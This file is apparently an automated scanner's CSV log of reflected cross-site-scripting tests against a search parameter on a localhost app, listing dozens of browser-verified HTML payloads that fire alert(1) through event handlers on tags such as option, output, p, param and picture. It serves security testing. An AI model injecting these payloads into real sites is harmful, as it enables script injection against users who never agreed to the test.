Timestamp,Target_URL,HTTP_Method,Parameter,Payload,Reflection_Type,Browser_Verified,XSS_Event_Type,Severity
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<optgroup onmouseover=""alert(1)"">test</optgroup>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<optgroup onmouseup=""alert(1)"">test</optgroup>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<optgroup onpaste=""alert(1)"" contenteditable>test</optgroup>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<option draggable=""true"" ondrag=""alert(1)"">test</option>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<option draggable=""true"" ondragend=""alert(1)"">test</option>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<option draggable=""true"" ondragenter=""alert(1)"">test</option>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<option draggable=""true"" ondragleave=""alert(1)"">test</option>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<option draggable=""true"" ondragstart=""alert(1)"">test</option>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<option id=x tabindex=1 onactivate=alert(1)></option>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<option id=x tabindex=1 onbeforeactivate=alert(1)></option>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<option id=x tabindex=1 onbeforedeactivate=alert(1)></option><input autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<option id=x tabindex=1 ondeactivate=alert(1)></option><input id=y autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<option id=x tabindex=1 onfocus=alert(1)></option>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<option id=x tabindex=1 onfocusin=alert(1)></option>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<option onbeforecopy=""alert(1)"" contenteditable>test</option>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<option onbeforecut=""alert(1)"" contenteditable>test</option>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<option onbeforepaste=""alert(1)"" contenteditable>test</option>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<option onblur=alert(1) tabindex=1 id=x></option><input autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<option onclick=""alert(1)"">test</option>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<option oncontextmenu=""alert(1)"">test</option>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<option oncopy=""alert(1)"" contenteditable>test</option>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<option oncut=""alert(1)"" contenteditable>test</option>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<option ondblclick=""alert(1)"">test</option>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<option onfocusout=alert(1) tabindex=1 id=x></option><input autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<option onkeydown=""alert(1)"" contenteditable>test</option>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<option onkeypress=""alert(1)"" contenteditable>test</option>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<option onkeyup=""alert(1)"" contenteditable>test</option>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<option onmousedown=""alert(1)"">test</option>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<option onmouseenter=""alert(1)"">test</option>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<option onmouseleave=""alert(1)"">test</option>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<option onmousemove=""alert(1)"">test</option>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<option onmouseout=""alert(1)"">test</option>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<option onmouseover=""alert(1)"">test</option>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<option onmouseup=""alert(1)"">test</option>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<option onpaste=""alert(1)"" contenteditable>test</option>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<output draggable=""true"" ondrag=""alert(1)"">test</output>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<output draggable=""true"" ondragend=""alert(1)"">test</output>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<output draggable=""true"" ondragenter=""alert(1)"">test</output>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<output draggable=""true"" ondragleave=""alert(1)"">test</output>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<output draggable=""true"" ondragstart=""alert(1)"">test</output>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<output id=x tabindex=1 onactivate=alert(1)></output>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<output id=x tabindex=1 onbeforeactivate=alert(1)></output>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<output id=x tabindex=1 onbeforedeactivate=alert(1)></output><input autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<output id=x tabindex=1 ondeactivate=alert(1)></output><input id=y autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<output id=x tabindex=1 onfocus=alert(1)></output>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<output id=x tabindex=1 onfocusin=alert(1)></output>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<output onbeforecopy=""alert(1)"" contenteditable>test</output>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<output onbeforecut=""alert(1)"" contenteditable>test</output>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<output onbeforepaste=""alert(1)"" contenteditable>test</output>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<output onblur=alert(1) tabindex=1 id=x></output><input autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<output onclick=""alert(1)"">test</output>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<output oncontextmenu=""alert(1)"">test</output>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<output oncopy=""alert(1)"" contenteditable>test</output>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<output oncut=""alert(1)"" contenteditable>test</output>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<output ondblclick=""alert(1)"">test</output>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<output onfocusout=alert(1) tabindex=1 id=x></output><input autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<output onkeydown=""alert(1)"" contenteditable>test</output>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<output onkeypress=""alert(1)"" contenteditable>test</output>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<output onkeyup=""alert(1)"" contenteditable>test</output>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<output onmousedown=""alert(1)"">test</output>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<output onmouseenter=""alert(1)"">test</output>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<output onmouseleave=""alert(1)"">test</output>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<output onmousemove=""alert(1)"">test</output>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<output onmouseout=""alert(1)"">test</output>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<output onmouseover=""alert(1)"">test</output>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<output onmouseup=""alert(1)"">test</output>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<output onpaste=""alert(1)"" contenteditable>test</output>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<p draggable=""true"" ondrag=""alert(1)"">test</p>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<p draggable=""true"" ondragend=""alert(1)"">test</p>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<p draggable=""true"" ondragenter=""alert(1)"">test</p>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<p draggable=""true"" ondragleave=""alert(1)"">test</p>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<p draggable=""true"" ondragstart=""alert(1)"">test</p>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<p id=x tabindex=1 onactivate=alert(1)></p>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<p id=x tabindex=1 onbeforeactivate=alert(1)></p>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<p id=x tabindex=1 onbeforedeactivate=alert(1)></p><input autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<p id=x tabindex=1 ondeactivate=alert(1)></p><input id=y autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<p id=x tabindex=1 onfocus=alert(1)></p>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<p id=x tabindex=1 onfocusin=alert(1)></p>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<p onbeforecopy=""alert(1)"" contenteditable>test</p>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<p onbeforecut=""alert(1)"" contenteditable>test</p>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<p onbeforepaste=""alert(1)"" contenteditable>test</p>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<p onblur=alert(1) tabindex=1 id=x></p><input autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<p onclick=""alert(1)"">test</p>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<p oncontextmenu=""alert(1)"">test</p>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<p oncopy=""alert(1)"" contenteditable>test</p>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<p oncut=""alert(1)"" contenteditable>test</p>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<p ondblclick=""alert(1)"">test</p>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<p onfocusout=alert(1) tabindex=1 id=x></p><input autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<p onkeydown=""alert(1)"" contenteditable>test</p>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<p onkeypress=""alert(1)"" contenteditable>test</p>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<p onkeyup=""alert(1)"" contenteditable>test</p>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<p onmousedown=""alert(1)"">test</p>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<p onmouseenter=""alert(1)"">test</p>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<p onmouseleave=""alert(1)"">test</p>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<p onmousemove=""alert(1)"">test</p>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<p onmouseout=""alert(1)"">test</p>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<p onmouseover=""alert(1)"">test</p>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<p onmouseup=""alert(1)"">test</p>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<p onpaste=""alert(1)"" contenteditable>test</p>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<param draggable=""true"" ondrag=""alert(1)"">test</param>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<param draggable=""true"" ondragend=""alert(1)"">test</param>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<param draggable=""true"" ondragenter=""alert(1)"">test</param>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<param draggable=""true"" ondragleave=""alert(1)"">test</param>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<param draggable=""true"" ondragstart=""alert(1)"">test</param>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<param id=x tabindex=1 onactivate=alert(1)></param>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<param id=x tabindex=1 onbeforeactivate=alert(1)></param>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<param id=x tabindex=1 onbeforedeactivate=alert(1)></param><input autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<param id=x tabindex=1 ondeactivate=alert(1)></param><input id=y autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<param id=x tabindex=1 onfocus=alert(1)></param>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<param id=x tabindex=1 onfocusin=alert(1)></param>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<param onbeforecopy=""alert(1)"" contenteditable>test</param>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<param onbeforecut=""alert(1)"" contenteditable>test</param>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<param onbeforepaste=""alert(1)"" contenteditable>test</param>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<param onblur=alert(1) tabindex=1 id=x></param><input autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<param onclick=""alert(1)"">test</param>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<param oncontextmenu=""alert(1)"">test</param>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<param oncopy=""alert(1)"" contenteditable>test</param>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<param oncut=""alert(1)"" contenteditable>test</param>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<param ondblclick=""alert(1)"">test</param>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<param onfocusout=alert(1) tabindex=1 id=x></param><input autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<param onkeydown=""alert(1)"" contenteditable>test</param>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<param onkeypress=""alert(1)"" contenteditable>test</param>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<param onkeyup=""alert(1)"" contenteditable>test</param>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<param onmousedown=""alert(1)"">test</param>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<param onmouseenter=""alert(1)"">test</param>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<param onmouseleave=""alert(1)"">test</param>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<param onmousemove=""alert(1)"">test</param>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<param onmouseout=""alert(1)"">test</param>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<param onmouseover=""alert(1)"">test</param>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<param onmouseup=""alert(1)"">test</param>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<param onpaste=""alert(1)"" contenteditable>test</param>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<path d=""M0,0"" style=""marker-start:url(test4.svg#a)""/>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<picture draggable=""true"" ondrag=""alert(1)"">test</picture>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<picture draggable=""true"" ondragend=""alert(1)"">test</picture>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<picture draggable=""true"" ondragenter=""alert(1)"">test</picture>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<picture draggable=""true"" ondragleave=""alert(1)"">test</picture>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<picture draggable=""true"" ondragstart=""alert(1)"">test</picture>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<picture id=x tabindex=1 onactivate=alert(1)></picture>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<picture id=x tabindex=1 onbeforeactivate=alert(1)></picture>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<picture id=x tabindex=1 onbeforedeactivate=alert(1)></picture><input autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<picture id=x tabindex=1 ondeactivate=alert(1)></picture><input id=y autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<picture id=x tabindex=1 onfocus=alert(1)></picture>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<picture id=x tabindex=1 onfocusin=alert(1)></picture>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<picture onbeforecopy=""alert(1)"" contenteditable>test</picture>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<picture onbeforecut=""alert(1)"" contenteditable>test</picture>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<picture onbeforepaste=""alert(1)"" contenteditable>test</picture>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<picture onblur=alert(1) tabindex=1 id=x></picture><input autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<picture onclick=""alert(1)"">test</picture>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<picture oncontextmenu=""alert(1)"">test</picture>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<picture oncopy=""alert(1)"" contenteditable>test</picture>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<picture oncut=""alert(1)"" contenteditable>test</picture>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<picture ondblclick=""alert(1)"">test</picture>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<picture onfocusout=alert(1) tabindex=1 id=x></picture><input autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<picture onkeydown=""alert(1)"" contenteditable>test</picture>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<picture onkeypress=""alert(1)"" contenteditable>test</picture>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<picture onkeyup=""alert(1)"" contenteditable>test</picture>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<picture onmousedown=""alert(1)"">test</picture>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<picture onmouseenter=""alert(1)"">test</picture>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<picture onmouseleave=""alert(1)"">test</picture>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<picture onmousemove=""alert(1)"">test</picture>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<picture onmouseout=""alert(1)"">test</picture>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<picture onmouseover=""alert(1)"">test</picture>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<picture onmouseup=""alert(1)"">test</picture>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<picture onpaste=""alert(1)"" contenteditable>test</picture>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<picture><source srcset=""validimage.png""><image onload=alert(1)></picture>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<picture><source srcset=""validimage.png""><image onloadend=alert(1)></picture>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<picture><source srcset=""validimage.png""><image onloadstart=alert(1)></picture>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<picture><source srcset=""validimage.png""><img onload=alert(1)></picture>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<picture><source srcset=""validimage.png""><img onloadend=alert(1)></picture>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<picture><source srcset=""validimage.png""><img onloadstart=alert(1)></picture>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<plaintext draggable=""true"" ondrag=""alert(1)"">test</plaintext>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<plaintext draggable=""true"" ondragend=""alert(1)"">test</plaintext>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<plaintext draggable=""true"" ondragenter=""alert(1)"">test</plaintext>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<plaintext draggable=""true"" ondragleave=""alert(1)"">test</plaintext>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<plaintext draggable=""true"" ondragstart=""alert(1)"">test</plaintext>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<plaintext id=x tabindex=1 onactivate=alert(1)></plaintext>,RAW_REFLECTION,Yes,alert,Critical
